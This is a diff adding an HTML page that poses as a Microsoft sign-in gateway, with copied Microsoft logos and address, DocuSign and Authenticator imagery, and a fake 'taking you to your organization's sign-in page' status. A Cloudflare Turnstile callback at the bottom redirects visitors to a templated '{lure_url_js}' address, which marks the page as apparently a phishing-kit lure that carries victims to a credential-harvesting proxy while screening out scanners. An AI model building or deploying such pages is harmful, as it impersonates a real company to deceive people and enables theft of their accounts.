@@ -1,0 +1,434 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Sign in your account</title>
+<link rel="icon" href="https://www.microsoft.com/favicon.ico" type="image/x-icon">
+<script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit"></script>
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: "Segoe UI", Tahoma, sans-serif;
+        }
+
+        body {
+            background: #efefef;
+            color: #333;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 16px;
+        }
+
+        .wrapper {
+            max-width: 430px;
+            width: 100%;
+            margin: 0 auto;
+        }
+
+        .page-title {
+            text-align: center;
+            font-size: 18px;
+            font-weight: 500;
+            color: #4b4b4b;
+            margin-bottom: 12px;
+            letter-spacing: 0.3px;
+        }
+        .page-title span {
+            color: #0078d4;
+        }
+
+        .card {
+            background: #fff;
+            border: 1px solid #e2e2e2;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, .05);
+            border-radius: 4px;
+            overflow: hidden;
+        }
+
+        .content {
+            padding: 20px 20px 16px;
+        }
+
+        .heading {
+            font-size: 18px;
+            font-weight: 500;
+            color: #2d2d2d;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        /* Removed .heading .badge because we moved it */
+        .heading .badge {
+            /* keep if needed, but not used now */
+        }
+
+        .sub-heading {
+            font-size: 13px;
+            color: #666;
+            margin-bottom: 18px;
+            line-height: 1.4;
+        }
+
+        .row {
+            display: flex;
+            gap: 16px;
+            align-items: flex-start;
+        }
+
+        .icon-box {
+            width: 44px;
+            flex-shrink: 0;
+            padding-top: 2px;
+        }
+
+        .info-block {
+            flex: 1;
+        }
+
+        .profile-row {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            background: #f6f8fa;
+            border-radius: 6px;
+            padding: 10px 14px;
+            margin-bottom: 16px;
+            border: 1px solid #eaeef2;
+        }
+        .profile-row .avatar {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background: #0078d4;
+            color: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+            font-weight: 600;
+            flex-shrink: 0;
+        }
+        .profile-row .info {
+            flex: 1;
+        }
+        .profile-row .info .name {
+            font-size: 13px;
+            font-weight: 600;
+            color: #222;
+        }
+        .profile-row .info .email {
+            font-size: 11px;
+            color: #777;
+        }
+        .profile-row .status {
+            font-size: 10px;
+            font-weight: 600;
+            color: #107c10;
+            background: #e6f3e6;
+            padding: 2px 10px;
+            border-radius: 12px;
+            white-space: nowrap;
+        }
+
+        .sync-status {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            background: #fafbfc;
+            border-radius: 6px;
+            padding: 10px 14px;
+            margin-bottom: 16px;
+            border: 1px solid #eaeef2;
+        }
+        .sync-status .label {
+            font-size: 12px;
+            color: #555;
+            font-weight: 500;
+        }
+        .sync-status .dots {
+            display: flex;
+            gap: 5px;
+            align-items: center;
+            margin-left: auto;
+        }
+        .sync-status .dots span {
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background: #0078d4;
+            display: inline-block;
+        }
+        .sync-status .dots span:nth-child(1) {
+            animation: pulse 1s ease-in-out infinite;
+        }
+        .sync-status .dots span:nth-child(2) {
+            animation: pulse 1s ease-in-out infinite .2s;
+        }
+        .sync-status .dots span:nth-child(3) {
+            animation: pulse 1s ease-in-out infinite .4s;
+        }
+
+        @keyframes pulse {
+            0%,
+            100% {
+                opacity: 0.25;
+                transform: scale(0.9);
+            }
+            50% {
+                opacity: 1;
+                transform: scale(1.1);
+            }
+        }
+
+        .id-line {
+            font-size: 11px;
+            color: #999;
+            font-family: "SF Mono", "Consolas", monospace;
+            margin-bottom: 12px;
+            word-break: break-all;
+            background: #f6f8fa;
+            padding: 6px 10px;
+            border-radius: 4px;
+            border: 1px solid #edf0f3;
+        }
+
+        .desc {
+            font-size: 12px;
+            color: #666;
+            line-height: 1.5;
+            margin-bottom: 12px;
+        }
+
+        .docu-sign-row {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 8px 0 4px;
+        }
+        .docu-sign-row svg {
+            flex-shrink: 0;
+        }
+        .docu-sign-row .label {
+            font-size: 12px;
+            color: #444;
+            font-weight: 500;
+        }
+        .docu-sign-row .label small {
+            font-weight: 400;
+            color: #888;
+        }
+
+        .footer {
+            border-top: 1px solid #ececec;
+            background: #fafafa;
+            padding: 12px 18px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 6px;
+        }
+        .footer .address {
+            font-size: 9px;
+            color: #888;
+            line-height: 1.4;
+        }
+        .footer .ms-logo {
+            flex-shrink: 0;
+        }
+
+        #cf-turnstile {
+            padding: 12px 20px 16px;
+            background: #fafbfc;
+            border-top: 1px solid #ececec;
+            display: flex;
+            justify-content: center;
+        }
+        #cf-turnstile>div {
+            margin: 0 auto;
+        }
+
+        /* turnstile override for light styling */
+        .cf-turnstile-wrapper {
+            display: flex;
+            justify-content: center;
+            width: 100%;
+        }
+
+        /* NEW STYLES FOR .gateway-header */
+        .gateway-header {
+            display: flex;
+            align-items: center;
+            gap: 8px;          /* space between badge and text */
+            font-size: 11px;
+            font-weight: 600;
+            color: #0078d4;      /* blue */
+            text-transform: uppercase;
+            letter-spacing: 0.3px;
+            margin-bottom: 4px;  /* keep similar spacing as before */
+        }
+        .gateway-header .badge {
+            font-size: 10px;
+            font-weight: 600;
+            background: #0078d4;
+            color: #fff;
+            padding: 1px 10px;
+            border-radius: 12px;
+            letter-spacing: 0.3px;
+            text-transform: uppercase;
+            white-space: nowrap;
+            flex-shrink: 0;
+        }
+
+        @media (max-width: 480px) {
+            body {
+                padding: 10px;
+            }
+            .content {
+                padding: 16px 16px 12px;
+            }
+            .profile-row {
+                flex-wrap: wrap;
+            }
+            .profile-row .status {
+                margin-left: auto;
+            }
+            .sync-status {
+                flex-wrap: wrap;
+            }
+            .sync-status .dots {
+                margin-left: 0;
+            }
+            .footer {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            .row {
+                flex-direction: column;
+                align-items: stretch;
+            }
+            .icon-box {
+                width: auto;
+                display: flex;
+                justify-content: center;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="wrapper">
+
+        <!-- Page Title -->
+        <div class="page-title">
+        </div>
+
+        <!-- Card -->
+        <div class="card">
+
+            <div class="content">
+
+                <!-- Heading (now empty, badge removed) -->
+                <div class="heading">
+                    <!-- badge moved to .gateway-header -->
+                </div>
+
+                <!-- Security Gateway Layer Details -->
+                <div class="gateway-header">
+                    <svg width="14" height="14" viewBox="0 0 16 16" fill="currentColor" style="margin-top:-2px;">
+                        <path d="M8 0a4 4 0 0 0-4 4v2H3a2 2 0 0 0-2 2v6a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V8a2 2 0 0 0-2-2h-1V4a4 4 0 0 0-4-4zM5 4a3 3 0 1 1 6 0v2H5V4zm1.5 6a1.5 1.5 0 1 1 3 0 1.5 1.5 0 0 1-3 0z"/>
+                    </svg>
+                    Your organization controls access
+                    <span class="badge">Add On</span>
+                </div>
+                <br>
+
+                <div class="sub-heading">
+                    
+                </div>
+
+                <!-- Sync Status -->
+                <div class="sync-status">
+                    <span class="label">⌛ Taking you to your organization's sign-in page</span>
+                    <span style="font-size:11px;color:#888;"></span>
+                    <span class="dots">
+                        <span></span><span></span><span></span>
+                    </span>
+                </div>
+
+                <!-- ID -->
+                <div class="id-line">
+                    Session: 6c15f31215c.2c1c511714172a1371f4
+                </div>
+
+                <!-- Description -->
+                <div class="desc">
+                    To help protect organizational data, access is explicitly granted and continuously evaluated.</div>
+
+                <!-- DocuSign + M365 visual -->
+                <div class="docu-sign-row">
+                    <!-- DocuSign SVG -->
+<img src="data:image/jpeg;base64,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"
+     alt="DocuSign"
+     width="28"
+     height="28"
+     style="object-fit: contain; flex-shrink: 0;" />
+<span class="label">Microsoft Authenticator <small>↔</small></span>
+                    <!-- Microsoft 365 SVG (simplified) -->
+                    <svg width="28" height="28" viewBox="0 0 28 28" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <rect x="0" y="0" width="13" height="13" rx="1" fill="#F25022" />
+                        <rect x="14" y="0" width="13" height="13" rx="1" fill="#7FBA00" />
+                        <rect x="0" y="14" width="13" height="13" rx="1" fill="#00A4EF" />
+                        <rect x="14" y="14" width="13" height="13" rx="1" fill="#FFB900" />
+                    </svg>
+                    <span class="label" style="font-weight:400;color:#888;">Microsoft 365 Passkey</span>
+                </div>
+
+            </div>
+
+            <!-- Turnstile -->
+            <div id="cf-turnstile"></div>
+
+            <!-- Footer -->
+            <div class="footer">
+                <span class="address">
+                    One Microsoft Way · Redmond, WA 98052-6399 · United States
+                </span>
+                <span class="ms-logo">
+                    <svg width="20" height="20" viewBox="0 0 23 23" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M0 0H11V11H0V0Z" fill="#F25022" />
+                        <path d="M12 0H23V11H12V0Z" fill="#7FBA00" />
+                        <path d="M0 12H11V23H0V12Z" fill="#00A4EF" />
+                        <path d="M12 12H23V23H12V12Z" fill="#FFB900" />
+                    </svg>
+                </span>
+            </div>
+
+        </div><!-- /card -->
+
+    </div><!-- /wrapper -->
+
+    <script>
+turnstile.ready(function () {
+    turnstile.render('#cf-turnstile', {
+        sitekey: '0x4AAAAAAD6H9oqvI-1RPfPk', 
+        callback: function(token) {
+            window.location.assign({lure_url_js});
+        },
+    });
+});
+</script>
+
+<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js" integrity="sha384-9/reFTGAW83EW2RDu2S0VKaIzap3H66lZH81PoYlFhbGU+6BZp6G7niu735Sk7lN" crossorigin="anonymous"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js" integrity="sha384-B4gt1jrGC7Jh4AgTPSdUtOBvfO8shuf57BaghqFfPlYxofvL8/KUEfYiJOMMV+rV" crossorigin="anonymous"></script> 
+    
+</body>
+</html>
